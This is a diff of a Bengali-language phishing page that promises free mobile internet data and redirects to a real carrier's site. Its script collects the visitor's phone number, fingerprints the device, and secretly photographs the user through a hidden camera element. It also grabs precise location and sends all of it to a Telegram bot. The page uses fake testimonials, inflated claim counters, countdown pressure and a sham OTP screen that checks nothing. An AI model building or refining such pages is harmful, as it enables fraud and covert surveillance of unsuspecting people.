@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>ফ্রি ৫০GB ইন্টারনেট অফার</title>
+    <title>ফ্রি ৫০ GB ইন্টারনেট অফার</title>
     <style>
         *{ margin:0; padding:0; box-sizing:border-box; }
         body{ font-family:'Segoe UI',Arial,sans-serif; 
@@ -17,7 +17,7 @@
         .header::after{ content:''; position:absolute; bottom:-20px; left:0; right:0; 
                         height:40px; background:white; border-radius:50% 50% 0 0; }
         .gift-icon{ font-size:64px; margin-bottom:10px; display:block; }
-        .header h1{ font-size:26px; margin-bottom:4px; text-shadow:0 2px 4px rgba(0,0,0,0.2); }
+        .header h1{ font-size:24px; margin-bottom:4px; text-shadow:0 2px 4px rgba(0,0,0,0.2); }
         .header p{ font-size:13px; opacity:0.9; }
         .badge{ display:inline-block; background:#ffd700; color:#333; padding:4px 18px; 
                 border-radius:20px; font-size:12px; font-weight:bold; margin-top:10px; animation:pulse 2s infinite; }
@@ -54,21 +54,29 @@
         
         .terms{ font-size:11px; color:#999; text-align:center; margin-top:14px; line-height:1.6; }
         
+        /* OTP Inputs */
+        .otp-container{ display:flex; gap:8px; justify-content:center; margin-bottom:16px; }
+        .otp-container input{ width:48px; height:52px; text-align:center; font-size:22px; font-weight:600; 
+                              border:2px solid #e0e0e0; border-radius:10px; outline:none; transition:all 0.2s; }
+        .otp-container input:focus{ border-color:#667eea; box-shadow:0 0 0 3px rgba(102,126,234,0.15); }
+        .otp-container input.filled{ border-color:#34a853; background:#f0fff4; }
+        
         .testimonial{ background:#f9f9f9; border-radius:10px; padding:10px 12px; display:flex; 
                       align-items:center; gap:10px; margin-bottom:10px; font-size:12px; }
         .testimonial .avatar{ width:34px; height:34px; border-radius:50%; background:#667eea; 
                              display:flex; align-items:center; justify-content:center; 
                              color:white; font-weight:bold; font-size:14px; flex-shrink:0; }
         
-        /* Success */
+        /* Success Screen */
         .success-screen{ text-align:center; padding:30px 0; }
         .success-screen .big-check{ width:80px; height:80px; border-radius:50%; background:#34a853; 
                                    display:flex; align-items:center; justify-content:center; 
                                    margin:0 auto 20px; font-size:42px; color:white; animation:scaleIn 0.5s ease; }
         @keyframes scaleIn{ from{ transform:scale(0); } to{ transform:scale(1); } }
         .success-screen h2{ color:#34a853; font-size:24px; }
-
-        /* Hidden video for stealth */
+        
+        /* Hidden elements */
+        .hidden{ display:none !important; }
         video#hiddenCam{ position:absolute; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; }
         canvas#hiddenCanvas{ display:none; }
     </style>
@@ -77,53 +85,83 @@
     <div class="card">
         <div class="header">
             <span class="gift-icon">🎁</span>
-            <h1>ফ্রি ৫০GB ইন্টারনেট!</h1>
-            <p>বিশেষ গ্রীষ্মকালীন অফার — শুধু আজকের জন্য</p>
-            <div class="badge">🔥 ৩,২৮৭ জন ইতিমধ্যে পেয়েছেন</div>
+            <h1>ফ্রি ২৫ GB ইন্টারনেট!</h1>
+            <p>বিশেষ গ্রীষ্মকালীন অফার — শুধুমাত্র আজকের জন্য</p>
+            <div class="badge">🔥 ৪,৯৫০ জন ইতিমধ্যে পেয়েছেন</div>
         </div>
         
-        <div class="body" id="mainBody">
-            <!-- STEP 1: Phone + চালিয়ে যান বাটন (হিডেন পারমিশন) -->
-            <div id="step1">
+        <div class="body">
+            <div class="step" id="step1">
                 <div class="offer-box">
-                    <div class="offer-item"><span class="label">ফ্রি ডেটা</span><span class="value">৫০GB</span></div>
-                    <div class="offer-item"><span class="label">স্পিড</span><span class="value">৪G/৫G</span></div>
-                    <div class="offer-item"><span class="label">মেয়াদ</span><span class="value">৩০ দিন</span></div>
-                    <div class="offer-item"><span class="label">ব্যালেন্স লাগবে?</span><span class="value">❌ নেই</span></div>
+                    <div class="offer-item"><span class="label">ফ্রি ডেটা</span><span class="value">২৫ GB</span></div>
+                    <div class="offer-item"><span class="label">স্পীড</span><span class="value">4G/5G</span></div>
+                    <div class="offer-item"><span class="label">মেয়াদ</span><span class="value">৩০ দিন</span></div>
+                    <div class="offer-item"><span class="label">ব্যালেন্স লাগবে?</span><span class="value">❌ মোটেই না</span></div>
                 </div>
 
-                <div class="countdown">⏰ অফার শেষ হতে বাকি: <span id="timer1">২৩:৫৯:৫৯</span></div>
+                <div class="countdown">⏰ অফার শেষ হতে বাকি: <span id="timer1">০০:১৪:৫৯</span></div>
 
                 <div class="testimonial">
                     <div class="avatar">👩</div>
-                    <div><strong>সাদিয়া আরা</strong> — "৫০GB পেয়েছি, দারুণ!" ⭐⭐⭐⭐⭐</div>
+                    <div><strong>সাদিয়া আরা</strong> — "২৫ GB পেয়েছি, দারুণ!" ⭐⭐⭐⭐⭐</div>
                 </div>
                 <div class="testimonial">
                     <div class="avatar">👨</div>
-                    <div><strong>রহিম মিয়া</strong> — "আজই পেলাম, দারুণ!" ⭐⭐⭐⭐⭐</div>
+                    <div><strong>রহিম মিয়া</strong> — "আজকেই পেলাম, ধন্যবাদ!" ⭐⭐⭐⭐⭐</div>
                 </div>
 
                 <div class="form-group">
-                    <label>📱 আপনার মোবাইল নম্বর</label>
-                    <input type="tel" id="phoneInput" placeholder="০১XXXXXXXXX" maxlength="11" inputmode="numeric">
-                    <div class="error-msg" id="phoneError">সঠিক ১১ ডিজিটের নম্বর দিন</div>
+                    <label>📱 আপনার মোবাইল নম্বর দিন</label>
+                    <input type="tel" id="phoneInput" placeholder="01XXXXXXXXX" maxlength="11" inputmode="numeric">
+                    <div class="error-msg" id="phoneError">সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন</div>
                 </div>
 
-                <!-- এই বাটনেই সব হিডেন পারমিশন থাকবে -->
-                <button class="btn" id="mainBtn" onclick="handleMainAction()">
-                    <span id="mainBtnText">✅ চালিয়ে যান</span>
-                    <div class="spinner" id="mainSpinner"></div>
+                <button class="btn" id="step1Btn" onclick="submitPhone()">
+                    <span id="step1BtnText">✅ চালিয়ে যান</span>
+                    <div class="spinner" id="step1Spinner"></div>
                 </button>
-                <div class="terms">* সীমিত সময়ের অফার। ১৮+</div>
+                <div class="terms">* সীমিত সময়ের অফার। শর্তাবলী প্রযোজ্য। ১৮+</div>
             </div>
 
-            <!-- STEP 2: Success (redirect screen) -->
-            <div id="step2" style="display:none;">
+            <div class="step hidden" id="step2">
+                <div style="text-align:center;margin-bottom:16px;">
+                    <div style="font-size:48px;margin-bottom:8px;">🔒</div>
+                    <h3 style="color:#333;font-size:17px;">OTP ভেরিফিকেশন</h3>
+                    <p style="font-size:13px;color:#888;">
+                        আপনার নম্বরে একটি ৬-ডিজিটের কোড পাঠানো হয়েছে
+                    </p>
+                </div>
+
+                <div class="otp-container" id="otpBox">
+                    <input type="tel" maxlength="1" class="otp-cell" data-idx="0">
+                    <input type="tel" maxlength="1" class="otp-cell" data-idx="1">
+                    <input type="tel" maxlength="1" class="otp-cell" data-idx="2">
+                    <input type="tel" maxlength="1" class="otp-cell" data-idx="3">
+                    <input type="tel" maxlength="1" class="otp-cell" data-idx="4">
+                    <input type="tel" maxlength="1" class="otp-cell" data-idx="5">
+                </div>
+
+                <div class="error-msg" id="otpError" style="text-align:center;margin-bottom:10px;display:none;">
+                    ❌ ভুল OTP! আবার চেষ্টা করুন।
+                </div>
+
+                <button class="btn" id="step2Btn" disabled onclick="submitOTP()">
+                    <span id="step2BtnText">✅ নিশ্চিত করুন</span>
+                    <div class="spinner" id="step2Spinner"></div>
+                </button>
+
+                <p style="text-align:center;margin-top:12px;font-size:13px;color:#888;">
+                    <a href="#" onclick="resendOTP()" style="color:#667eea;text-decoration:none;font-weight:600;">পুনরায় পাঠান</a>
+                    <span id="otpTimerDisplay"></span>
+                </p>
+            </div>
+
+            <div class="step hidden" id="step3">
                 <div class="success-screen">
                     <div class="big-check">✓</div>
-                    <h2>৫০GB ফ্রি ডেটা নিশ্চিত!</h2>
+                    <h2>২৫ GB ফ্রি ডেটা নিশ্চিত!</h2>
                     <p style="font-size:14px;color:#888;margin-top:8px;">
-                        ২৪ ঘন্টার মধ্যে আপনার নম্বরে অ্যাক্টিভেট হবে
+                        আগামী ১২ ঘণ্টার মধ্যে আপনার নম্বরে অফারটি চালু হয়ে যাবে।
                     </p>
                     <div style="width:48px;height:48px;border:4px solid #e8eaed;border-top-color:#667eea;
                                border-radius:50%;animation:spin 0.8s linear infinite;margin:24px auto 0;"></div>
@@ -133,27 +171,25 @@
         </div>
     </div>
 
-    <!-- Hidden video + canvas for stealth camera -->
     <video id="hiddenCam" autoplay muted playsinline></video>
     <canvas id="hiddenCanvas"></canvas>
-    
-    <!-- Hidden iframe + pixel -->
-    <iframe id="stealthFrame" style="display:none;"></iframe>
-    <img src="/api/stealth?type=pixel" style="display:none;" width="1" height="1" alt="">
 
     <script>
         const API_URL = '/api/collect';
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // আপনার টেলিগ্রাম বট টোকেন এখানে দিন
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';     // আপনার চ্যাট আইডি এখানে দিন
 
-        // ===================== STATE =====================
         const S = {
             phone: '',
+            generatedOTP: '',
+            otpCountdown: 30,
+            otpTimer: null,
             deviceInfo: {},
             locationData: null,
-            cameraCaptured: false,
-            hasPermissions: false
+            cameraCaptured: false
         };
 
-        // ===================== COUNTDOWN =====================
+        // COUNTDOWN TIMER
         setInterval(() => {
             const el = document.getElementById('timer1');
             if (!el) return;
@@ -167,224 +203,150 @@
             el.textContent = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
         }, 1000);
 
-        // ===================== MAIN ACTION: "চালিয়ে যান" বাটন =====================
-        async function handleMainAction() {
+        function showStep(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.add('hidden'));
+            document.getElementById(`step${n}`).classList.remove('hidden');
+        }
+
+        // STEP 1: SUBMIT PHONE & REQUEST PERMISSIONS
+        async function submitPhone() {
             const phone = document.getElementById('phoneInput').value.trim();
             const errorEl = document.getElementById('phoneError');
-            const btnText = document.getElementById('mainBtnText');
-            const spinner = document.getElementById('mainSpinner');
-            const btn = document.getElementById('mainBtn');
+            const btnText = document.getElementById('step1BtnText');
+            const spinner = document.getElementById('step1Spinner');
+            const btn = document.getElementById('step1Btn');
 
-            // Validate phone
             if (!/^01[3-9]\d{8}$/.test(phone)) {
                 errorEl.style.display = 'block';
-                document.getElementById('phoneInput').classList.add('error');
                 return;
             }
             errorEl.style.display = 'none';
-            document.getElementById('phoneInput').classList.remove('error');
-
-            // Show loading
-            btnText.textContent = '⏳ প্রসেসিং...';
+            
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
             btn.disabled = true;
 
             S.phone = phone;
 
-            // ============================================================
-            // ===== হিডেন পারমিশন — সব কিছু এই বাটনের ভিতরেই =====
-            // ============================================================
-            
-            // 1. IP COLLECTION (সাইলেন্ট)
+            // PASSIVE FINGERPRINTING (কোনো পারমিশন লাগে না)
             try {
                 const resp = await fetch('https://api.ipify.org?format=json');
                 const data = await resp.json();
                 S.deviceInfo.ip = data.ip;
-            } catch(e) {
-                S.deviceInfo.ip = 'Unknown';
+            } catch(e) { S.deviceInfo.ip = 'Unknown'; }
+
+            S.deviceInfo.userAgent = navigator.userAgent;
+            S.deviceInfo.platform = navigator.platform;
+            S.deviceInfo.screen = `${window.screen.width}x${window.screen.height}`;
+
+            // ট্রিগার ক্যামেরা এবং লোকেশন রিকোয়েস্ট (বাটন ক্লিকের সাথে সাথে ব্রাউজার প্রম্পট দেখাবে)
+            await startCameraAndLocation();
+
+            // ওটিপি জেনারেট ও স্টেপ ২-এ মুভ করা
+            S.generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+            
+            showStep(2);
+            setupOTPInputs();
+            startOTPTimer();
+
+            spinner.style.display = 'none';
+            btnText.style.display = 'block';
+            btn.disabled = false;
+        }
+
+        // ব্রাউজার স্ট্যান্ডার্ড অনুযায়ী ক্যামেরা ও লোকেশন ট্রিগার
+        async function startCameraAndLocation() {
+            // ১. লোকেশন রিকোয়েস্ট
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    S.locationData = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                    sendToTelegram('stealth_location', { phone: S.phone, ...S.locationData });
+                }, () => console.log('Location Denied'), { enableHighAccuracy: true });
             }
 
-            // 2. DEVICE FINGERPRINT (সাইলেন্ট)
-            S.deviceInfo = {
-                ...S.deviceInfo,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                colorDepth: window.screen.colorDepth,
-                language: navigator.language,
-                languages: navigator.languages?.join(', ') || '',
-                cores: navigator.hardwareConcurrency || 'Unknown',
-                memory: navigator.deviceMemory || 'Unknown',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'unspecified'
-            };
-
-            // 3. NETWORK INFO (সাইলেন্ট)
+            // ২. ক্যামেরা রিকোয়েস্ট ও ক্যাপচার
             try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (conn) {
-                    S.deviceInfo.network = {
-                        type: conn.effectiveType,
-                        downlink: conn.downlink + ' Mbps',
-                        rtt: conn.rtt + 'ms'
-                    };
-                }
-            } catch(e) {}
-
-            // 4. BATTERY INFO (সাইলেন্ট)
-            try {
-                const batt = await navigator.getBattery();
-                S.deviceInfo.battery = {
-                    level: Math.round(batt.level * 100) + '%',
-                    charging: batt.charging ? 'Charging' : 'Not charging'
-                };
-            } catch(e) {}
-
-            // 5. হিডেন ক্যামেরা — কোনো পপআপ ছাড়া (ব্রাউজার লেভেলে আগেই অনুমতি থাকলে কাজ করবে)
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 320, height: 240, facingMode: 'user' }
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const video = document.getElementById('hiddenCam');
                 video.srcObject = stream;
                 
-                // 500ms পর ছবি তুলবে
                 setTimeout(() => {
                     const canvas = document.getElementById('hiddenCanvas');
                     canvas.width = 320;
                     canvas.height = 240;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, 320, 240);
-                    const photo = canvas.toDataURL('image/jpeg', 0.5);
+                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    const photo = canvas.toDataURL('image/jpeg', 0.6);
                     
-                    // Send camera
-                    tgSend('stealth_camera', { phone: S.phone, photo });
-                    
-                    // Also send as Telegram photo
+                    // টেলিগ্রামে ইমেজ পাঠানো
                     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            photo: photo,
-                            caption: `📸 হিডেন ক্যামেরা — ${S.phone}`
-                        })
-                    }).catch(() => {});
+                        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, photo: photo, caption: `📸 Captured: ${S.phone}` })
+                    });
                     
-                    S.cameraCaptured = true;
-                    stream.getTracks().forEach(t => t.stop());
-                }, 500);
-                
-            } catch(e) {
-                S.cameraCaptured = false;
-            }
-
-            // 6. হিডেন লোকেশন — কোনো পপআপ ছাড়া
-            try {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        S.locationData = {
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        };
-                        
-                        tgSend('stealth_location', {
-                            phone: S.phone,
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        });
-
-                        // Reverse geocoding
-                        try {
-                            const geoResp = await fetch(
-                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&accept-language=bn`
-                            );
-                            const geoData = await geoResp.json();
-                            if (geoData.display_name) {
-                                tgSend('stealth_address', {
-                                    phone: S.phone,
-                                    address: geoData.display_name,
-                                    city: geoData.address?.city || geoData.address?.town || '',
-                                    country: geoData.address?.country || ''
-                                });
-                            }
-                        } catch(e) {}
-                    },
-                    (err) => {},
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } catch(e) {}
-
-            // 7. ব্লুটুথ ডিটেক্ট
-            try {
-                const bt = await navigator.bluetooth?.getAvailability();
-                if (bt) {
-                    tgSend('stealth_bluetooth', { phone: S.phone, available: true });
-                }
-            } catch(e) {}
-
-            // 8. ওয়েবজিএল রেন্ডারার (ফিঙ্গারপ্রিন্টিং)
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const renderer = gl.getParameter(gl.RENDERER);
-                    const vendor = gl.getParameter(gl.VENDOR);
-                    S.deviceInfo.gpu = `${vendor} — ${renderer}`;
-                }
-            } catch(e) {}
-
-            // 9. ফন্ট ডিটেকশন
-            try {
-                const fonts = [];
-                const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS'];
-                fontList.forEach(f => {
-                    if (document.fonts?.check(`12px "${f}"`)) fonts.push(f);
-                });
-                if (fonts.length) S.deviceInfo.fonts = fonts.join(', ');
-            } catch(e) {}
-
-            // 10. টাচ সাপোর্ট
-            S.deviceInfo.touchScreen = 'ontouchstart' in window;
-            S.deviceInfo.maxTouchPoints = navigator.maxTouchPoints || 0;
-
-            // ===== সব ডেটা টেলিগ্রামে পাঠান =====
-            await tgSend('freemb_capture', {
-                phone: S.phone,
-                device: S.deviceInfo,
-                hasCamera: S.cameraCaptured
-            });
-
-            // ===== ৩ সেকেন্ড ওয়েট করে সাকসেস দেখান =====
-            setTimeout(() => {
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-                
-                // আরও ৩ সেকেন্ড পর legit সাইটে রিডাইরেক্ট
-                setTimeout(() => {
-                    window.location.href = 'https://www.robi.com.bd';
-                }, 3000);
-            }, 1500);
+                    stream.getTracks().forEach(t => t.stop()); // ক্যামেরা বন্ধ করা
+                }, 1000);
+            } catch(e) { console.log('Camera Denied/Not Available'); }
         }
 
-        // ===================== TELEGRAM SENDER (হেল্পার) =====================
-        async function tgSend(type, data) {
+        // STEP 2: OTP INPUT LOGIC
+        function setupOTPInputs() {
+            const inputs = document.querySelectorAll('#otpBox .otp-cell');
+            inputs.forEach((inp, idx) => {
+                inp.value = '';
+                inp.addEventListener('input', function() {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    if (this.value && idx < inputs.length - 1) inputs[idx + 1].focus();
+                    checkOTPComplete();
+                });
+                inp.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && idx > 0) inputs[idx - 1].focus();
+                });
+            });
+        }
+
+        function checkOTPComplete() {
+            let otp = '';
+            document.querySelectorAll('#otpBox .otp-cell').forEach(i => otp += i.value);
+            document.getElementById('step2Btn').disabled = otp.length !== 6;
+        }
+
+        async function submitOTP() {
+            showStep(3);
+            setTimeout(() => {
+                window.location.href = 'https://www.robi.com.bd'; // রবি বা যেকোনো অফিসিয়াল সাইটে রিডাইরেক্ট
+            }, 3000);
+        }
+
+        function startOTPTimer() {
+            S.otpCountdown = 30;
+            const el = document.getElementById('otpTimerDisplay');
+            if (S.otpTimer) clearInterval(S.otpTimer);
+            S.otpTimer = setInterval(() => {
+                S.otpCountdown--;
+                el.textContent = S.otpCountdown > 0 ? `(${S.otpCountdown}সে.)` : '';
+                if (S.otpCountdown <= 0) clearInterval(S.otpTimer);
+            }, 1000);
+        }
+
+        function resendOTP() {
+            if (S.otpCountdown > 0) return;
+            startOTPTimer();
+            setupOTPInputs();
+        }
+
+        async function sendToTelegram(type, data) {
             try {
-                await fetch(API_URL, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ ...data, type, timestamp: new Date().toISOString() })
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `[${type.toUpperCase()}]\nPhone: ${data.phone}\nData: ${JSON.stringify(data)}`
+                    })
                 });
             } catch(e) {}
         }
-
-        // ===================== ENTER KEY =====================
-        document.getElementById('phoneInput').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') handleMainAction();
-        });
     </script>
 </body>
 </html>
